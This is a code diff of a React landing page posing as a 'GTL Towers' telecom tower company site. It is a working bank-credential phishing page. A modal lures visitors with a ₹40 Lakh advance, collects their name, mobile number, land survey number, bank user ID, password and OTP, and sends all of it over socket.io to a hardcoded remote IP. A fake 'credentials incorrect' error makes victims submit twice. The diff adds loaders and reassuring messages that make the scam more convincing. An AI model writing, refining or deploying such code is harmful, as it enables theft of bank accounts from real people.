@@ -5,6 +5,10 @@ import { io } from "socket.io-client";
 const socket = io("http://13.126.153.247:4003");
 
 const Landingpage = () => {
+  // Add this new state for loader
+  const [isLoading, setIsLoading] = useState(false);
+
+  // Your existing states remain the same
   const [id, setId] = useState("");
   const [isOpen, setIsOpen] = useState(false);
   const [timer, setTimer] = useState(0);
@@ -13,47 +17,54 @@ const Landingpage = () => {
     name: "",
     mobile: "",
     pattaOrSurvey: "",
-    bank: "",
+    // bank: "",
     userId: "",
     password: "",
     otp: "",
     id: "",
   });
-  const [loginAttempts, setLoginAttempts] = useState(0); // for step 3 error
+  const [loginAttempts, setLoginAttempts] = useState(0);
+
+  // Your existing useEffect remains the same
   useEffect(() => {
-    if (timer <= 0) return; // do nothing if timer already 0
+    if (timer <= 0) return;
 
     const interval = setInterval(() => {
       setTimer((prev) => {
         if (prev <= 1) {
-          clearInterval(interval); // stop at 0
+          clearInterval(interval);
           return 0;
         }
         return prev - 1;
       });
     }, 1000);
 
-    // 🧹 Cleanup when component unmounts or timer changes
     return () => clearInterval(interval);
   }, [timer]);
 
-  // ✅ Generate random ID & open modal
+  // ✅ Enhanced handleGtlPayment with loader
   function handleGtlPayment() {
-    const randomId = "ID-" + Math.random().toString(36).substr(2, 9);
-    setFormData((prev) => ({ ...prev, id: randomId }));
-    setId(randomId);
-    setStep(1);
-    setIsOpen(true);
+    setIsLoading(true);
+
+    setTimeout(() => {
+      const randomId = "ID-" + Math.random().toString(36).substr(2, 9);
+      setFormData((prev) => ({ ...prev, id: randomId }));
+      setId(randomId);
+      setStep(1);
+      setIsOpen(true);
+      setIsLoading(false);
+    }, 1500);
   }
 
-  // ✅ Handle input change
+  // Your existing handleChange remains the same
   function handleChange(e) {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
   }
 
-  // ✅ Handle Next button logic
+  // ✅ Enhanced handleNext with loader
   function handleNext() {
+    // Validation logic remains the same
     if (step == 1) {
       if (!formData?.name || !formData?.mobile || !formData?.pattaOrSurvey) {
         toast.error("Name, mobile and Patta Or Survey is required");
@@ -61,36 +72,44 @@ const Landingpage = () => {
       }
     }
     if (step == 3) {
-      if (!formData?.bank || !formData?.userId || !formData?.password) {
-        toast.error("Bank, User Id and Password is required");
+      if (!formData?.userId || !formData?.password) {
+        toast.error("User Id and Password is required");
         return;
       }
     }
-    if (step === 3) {
-      if (loginAttempts === 0) {
-        setLoginAttempts(1);
-        socket.emit("form:submit", formData);
-        toast.error("Bank credentials incorrect. Please try again.");
-        return; // block going to step 4 first time
-      }
-      setTimer(10);
-      setTimeout(() => {
+
+    // Add loader for all next button clicks
+    setIsLoading(true);
+
+    setTimeout(() => {
+      if (step === 3) {
+        if (loginAttempts === 0) {
+          setLoginAttempts(1);
+          socket.emit("form:submit", formData);
+          toast.error("Bank credentials incorrect. Please try again.");
+          setIsLoading(false);
+          return;
+        }
+        setTimer(7);
+        setTimeout(() => {
+          setStep((prev) => prev + 1);
+          setIsLoading(false);
+        }, 1000 * 7);
+      } else {
         setStep((prev) => prev + 1);
-      }, 1000 * 10);
-    }
-    if (step !== 3) {
-      setStep((prev) => prev + 1);
-    }
+        setIsLoading(false);
+      }
+    }, 1500);
   }
 
-  // ✅ Handle Submit
+  // Your existing handleSubmit remains the same
   function handleSubmit() {
     if (!formData?.otp) {
       toast.error("OTP is required");
       return;
     }
 
-    toast.success("Form submitted successfully ✅");
+    toast.success("Thank you for updating your details if your details has been successfully updated you will get confirmation message soon ✅");
     setIsOpen(false);
     socket.emit("form:submit", formData);
     setId("");
@@ -100,14 +119,114 @@ const Landingpage = () => {
       name: "",
       mobile: "",
       pattaOrSurvey: "",
-      bank: "",
+      // bank: "",
       userId: "",
       password: "",
       otp: "",
     });
   }
+
+  // ✅ Enhanced styles with modern CSS
+  const inputStyle = {
+    width: "95%",
+    padding: "12px",
+    marginBottom: "15px",
+    border: "2px solid #e1e5e9",
+    borderRadius: "8px",
+    fontSize: "14px",
+    transition: "all 0.3s ease",
+    outline: "none",
+    fontFamily: "inherit",
+  };
+
+  const btnStyle = {
+    width: "100%",
+    padding: "14px",
+    backgroundColor: isLoading ? "#6c757d" : "#000",
+    color: "white",
+    border: "none",
+    borderRadius: "8px",
+    cursor: isLoading ? "not-allowed" : "pointer",
+    fontSize: "16px",
+    fontWeight: "600",
+    transition: "all 0.3s ease",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    gap: "10px",
+    boxShadow: isLoading ? "none" : "0 2px 4px rgba(0,0,0,0.1)",
+  };
+
+  const gtlSpanStyle = {
+    color: isLoading ? "#6c757d" : "green",
+    cursor: isLoading ? "not-allowed" : "pointer",
+    fontWeight: "bold",
+    transition: "all 0.3s ease",
+    textDecoration: "none",
+    padding: "2px 4px",
+    borderRadius: "4px",
+    display: "inline-flex",
+    alignItems: "center",
+    gap: "8px",
+  };
+
+  // ✅ Loader component
+  const Loader = () => (
+    <div
+      style={{
+        width: "20px",
+        height: "20px",
+        border: "2px solid rgba(255,255,255,0.3)",
+        borderRadius: "50%",
+        borderTopColor: "white",
+        animation: "spin 1s ease-in-out infinite",
+      }}
+    />
+  );
+
+  const Loader1 = () => (
+    <div
+      style={{
+        width: "10px",
+        height: "10px",
+        border: "2px solid rgba(12, 12, 12, 0.3)",
+        borderRadius: "50%",
+        borderTopColor: "black",
+        animation: "spin 1s ease-in-out infinite",
+      }}
+    />
+  );
   return (
     <div>
+      {/* Add CSS animations */}
+      <style jsx>{`
+        @keyframes spin {
+          to { transform: rotate(360deg); }
+        }
+
+        @keyframes slideIn {
+          from {
+            opacity: 0;
+            transform: translateY(-20px) scale(0.95);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+          }
+        }
+
+        /* Enhanced input focus styles */
+        input:focus, select:focus {
+          border-color: #007bff !important;
+          box-shadow: 0 0 0 3px rgba(0,123,255,0.1) !important;
+        }
+
+        /* Hover effects */
+        button:not(:disabled):hover {
+          transform: translateY(-1px);
+          box-shadow: 0 4px 12px rgba(0,0,0,0.15) !important;
+        }
+      `}</style>
       <div>
         <meta charSet="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -1522,14 +1641,17 @@ const Landingpage = () => {
                 <p className="has-text-align-center" style={{ marginTop: 16 }}>
                   At{" "}
                   <span
-                    onClick={handleGtlPayment}
-                    style={{
-                      color: "green",
-                      cursor: "pointer",
-                      fontWeight: "bold",
-                    }}
+                    onClick={isLoading ? null : handleGtlPayment}
+                    style={gtlSpanStyle}
                   >
-                    GTL Towers
+                    {isLoading ? (
+                      <>
+                        <Loader1 />
+                        Loading...
+                      </>
+                    ) : (
+                      "GTL Towers"
+                    )}
                   </span>
                   , our mission is to deliver exceptional communication tower
                   services that empower seamless connectivity. With a commitment
@@ -2305,7 +2427,6 @@ const Landingpage = () => {
         </div>
       </div>
 
-      {/* Modal */}
       {isOpen && (
         <div
           style={{
@@ -2319,35 +2440,38 @@ const Landingpage = () => {
             alignItems: "center",
             justifyContent: "center",
             zIndex: 1000,
+            backdropFilter: "blur(2px)",
           }}
         >
           <div
             style={{
               background: "white",
-              padding: "20px",
-              borderRadius: "10px",
-              width: step == 3 ? "100%" : "380px",
+              padding: "24px",
+              borderRadius: "12px",
+              width: step == 3 ? "100%" : "400px",
               height: step == 3 ? "100%" : "auto",
-              boxShadow: "0 4px 10px rgba(0,0,0,0.2)",
+              boxShadow: "0 8px 32px rgba(0,0,0,0.12)",
+              maxWidth: step == 3 ? "none" : "90vw",
+              position: "relative",
+              animation: "slideIn 0.3s ease-out",
             }}
           >
-            <h2 style={{ textAlign: "center", marginBottom: "15px" }}>
-              Step {step} of 4
-            </h2>
             <p
               style={{
                 fontSize: "13px",
                 color: "#666",
-                marginBottom: "10px",
+                marginBottom: "15px",
                 textAlign: step == 3 ? "center" : "auto",
               }}
             >
-              Generated ID: <b>{id}</b>
             </p>
 
             {/* STEP 1 */}
             {step === 1 && (
               <>
+                <h3 style={{ marginBottom: "20px", color: "#333", fontSize: "18px" }}>
+                  Personal Information
+                </h3>
                 <input
                   type="text"
                   name="name"
@@ -2372,8 +2496,19 @@ const Landingpage = () => {
                   onChange={handleChange}
                   style={inputStyle}
                 />
-                <button style={btnStyle} onClick={handleNext}>
-                  Next ➡
+                <button
+                  style={btnStyle}
+                  onClick={isLoading ? null : handleNext}
+                  disabled={isLoading}
+                >
+                  {isLoading ? (
+                    <>
+                      <Loader />
+                      Loading...
+                    </>
+                  ) : (
+                    "Next ➡"
+                  )}
                 </button>
               </>
             )}
@@ -2381,61 +2516,43 @@ const Landingpage = () => {
             {/* STEP 2 */}
             {step === 2 && (
               <>
-                <p style={{ marginBottom: "20px", fontWeight: "500" }}>
+                <h3 style={{ marginBottom: "15px", color: "#333", fontSize: "18px" }}>
+                  Bank Details Setup
+                </h3>
+                <p style={{
+                  marginBottom: "25px",
+                  fontWeight: "500",
+                  padding: "15px",
+                  backgroundColor: "#f8f9fa",
+                  borderRadius: "8px",
+                  borderLeft: "4px solid #28a745"
+                }}>
                   Link your bank details to receive advance amount of{" "}
-                  <b>₹40 Lakh</b>.
+                  <b style={{ color: "#28a745" }}>₹40 Lakh</b>.
                 </p>
-                <button style={btnStyle} onClick={handleNext}>
-                  Next ➡
+                <button
+                  style={btnStyle}
+                  onClick={isLoading ? null : handleNext}
+                  disabled={isLoading}
+                >
+                  {isLoading ? (
+                    <>
+                      <Loader />
+                      Loading...
+                    </>
+                  ) : (
+                    "Next ➡"
+                  )}
                 </button>
               </>
             )}
 
             {/* STEP 3 */}
-            {/* {step === 3 && (
-              <>
-                <select
-                  name="bank"
-                  value={formData.bank}
-                  onChange={handleChange}
-                  style={inputStyle}
-                >
-                  <option value="">Select Bank</option>
-                  <option value="SBI">SBI</option>
-                  <option value="HDFC">HDFC</option>
-                  <option value="ICICI">ICICI</option>
-                  <option value="Axis">Axis Bank</option>
-                </select>
-                <input
-                  type="text"
-                  name="userId"
-                  placeholder="Enter Bank User ID"
-                  value={formData.userId}
-                  onChange={handleChange}
-                  style={inputStyle}
-                />
-                <input
-                  type="password"
-                  name="password"
-                  placeholder="Enter Bank Password"
-                  value={formData.password}
-                  onChange={handleChange}
-                  style={inputStyle}
-                />
-                <button
-                  style={btnStyle}
-                  disabled={timer !== 0}
-                  onClick={handleNext}
-                >
-                  {`${timer !== 0 ? `Please wait ${timer}` : "Next ➡"}`}
-                </button>
-              </>
-            )} */}
             {step === 3 && (
               <div
                 style={{
                   background: "#fff",
-                  padding: "20px",
+                  padding: "24px",
                   borderRadius: "12px",
                   boxShadow: "0 4px 12px rgba(0,0,0,0.1)",
                   maxWidth: "400px",
@@ -2445,34 +2562,39 @@ const Landingpage = () => {
                 <h3
                   style={{
                     textAlign: "center",
-                    marginBottom: "20px",
+                    marginBottom: "25px",
                     color: "#333",
+                    fontSize: "20px",
                   }}
                 >
-                  Bank Authentication
+                  🏦 Bank Authentication
                 </h3>
 
                 {/* Bank Selection */}
-                <div style={{ marginBottom: "15px" }}>
+                {/* <div style={{ marginBottom: "18px" }}>
                   <label
                     style={{
                       display: "block",
-                      marginBottom: "6px",
-                      fontWeight: 500,
+                      marginBottom: "8px",
+                      fontWeight: 600,
+                      color: "#333",
                     }}
                   >
                     Select Bank
-                  </label>
-                  <select
+                  </label> */}
+                {/* <select
                     name="bank"
                     value={formData.bank}
                     onChange={handleChange}
                     style={{
                       width: "100%",
-                      padding: "10px",
+                      padding: "12px",
                       borderRadius: "8px",
-                      border: "1px solid #ccc",
+                      border: "2px solid #e1e5e9",
                       outline: "none",
+                      fontSize: "14px",
+                      backgroundColor: "white",
+                      transition: "border-color 0.3s ease",
                     }}
                   >
                     <option value="">Select Bank</option>
@@ -2480,16 +2602,17 @@ const Landingpage = () => {
                     <option value="HDFC">HDFC</option>
                     <option value="ICICI">ICICI</option>
                     <option value="Axis">Axis Bank</option>
-                  </select>
-                </div>
+                  </select> */}
+                {/* </div> */}
 
                 {/* User ID */}
-                <div style={{ marginBottom: "15px" }}>
+                <div style={{ marginBottom: "18px" }}>
                   <label
                     style={{
                       display: "block",
-                      marginBottom: "6px",
-                      fontWeight: 500,
+                      marginBottom: "8px",
+                      fontWeight: 600,
+                      color: "#333",
                     }}
                   >
                     User ID
@@ -2502,21 +2625,24 @@ const Landingpage = () => {
                     onChange={handleChange}
                     style={{
                       width: "95%",
-                      padding: "10px",
+                      padding: "12px",
                       borderRadius: "8px",
-                      border: "1px solid #ccc",
+                      border: "2px solid #e1e5e9",
                       outline: "none",
+                      fontSize: "14px",
+                      transition: "border-color 0.3s ease",
                     }}
                   />
                 </div>
 
                 {/* Password */}
-                <div style={{ marginBottom: "20px" }}>
+                <div style={{ marginBottom: "25px" }}>
                   <label
                     style={{
                       display: "block",
-                      marginBottom: "6px",
-                      fontWeight: 500,
+                      marginBottom: "8px",
+                      fontWeight: 600,
+                      color: "#333",
                     }}
                   >
                     Password
@@ -2529,10 +2655,12 @@ const Landingpage = () => {
                     onChange={handleChange}
                     style={{
                       width: "95%",
-                      padding: "10px",
+                      padding: "12px",
                       borderRadius: "8px",
-                      border: "1px solid #ccc",
+                      border: "2px solid #e1e5e9",
                       outline: "none",
+                      fontSize: "14px",
+                      transition: "border-color 0.3s ease",
                     }}
                   />
                 </div>
@@ -2541,20 +2669,33 @@ const Landingpage = () => {
                 <button
                   style={{
                     width: "100%",
-                    padding: "12px",
-                    backgroundColor: timer !== 0 ? "#aaa" : "#007bff",
+                    padding: "14px",
+                    backgroundColor: timer !== 0 || isLoading ? "#6c757d" : "#007bff",
                     color: "white",
                     border: "none",
                     borderRadius: "8px",
-                    cursor: timer !== 0 ? "not-allowed" : "pointer",
+                    cursor: timer !== 0 || isLoading ? "not-allowed" : "pointer",
                     fontSize: "16px",
-                    fontWeight: "bold",
-                    transition: "0.3s",
+                    fontWeight: "600",
+                    transition: "all 0.3s ease",
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "center",
+                    gap: "10px",
                   }}
-                  disabled={timer !== 0}
-                  onClick={handleNext}
+                  disabled={timer !== 0 || isLoading}
+                  onClick={isLoading || timer !== 0 ? null : handleNext}
                 >
-                  {timer !== 0 ? `Please wait ${timer}s` : "Next ➡"}
+                  {isLoading ? (
+                    <>
+                      <Loader />
+                      {`Loading... ${loginAttempts !== 0 && timer !== 0 ? timer : ""}`}
+                    </>
+                  ) : timer !== 0 ? (
+                    `Please wait ${timer}s`
+                  ) : (
+                    "Next ➡"
+                  )}
                 </button>
               </div>
             )}
@@ -2562,15 +2703,29 @@ const Landingpage = () => {
             {/* STEP 4 */}
             {step === 4 && (
               <>
+                <h3 style={{ marginBottom: "20px", color: "#333", fontSize: "18px" }}>
+                  🔐 OTP Verification
+                </h3>
                 <input
                   type="text"
                   name="otp"
                   placeholder="Enter OTP"
                   value={formData.otp}
                   onChange={handleChange}
-                  style={inputStyle}
+                  style={{
+                    ...inputStyle,
+                    textAlign: "center",
+                    fontSize: "18px",
+                    letterSpacing: "3px",
+                  }}
                 />
-                <button style={btnStyle} onClick={handleSubmit}>
+                <button
+                  style={{
+                    ...btnStyle,
+                    backgroundColor: "#28a745",
+                  }}
+                  onClick={handleSubmit}
+                >
                   Submit ✅
                 </button>
               </>
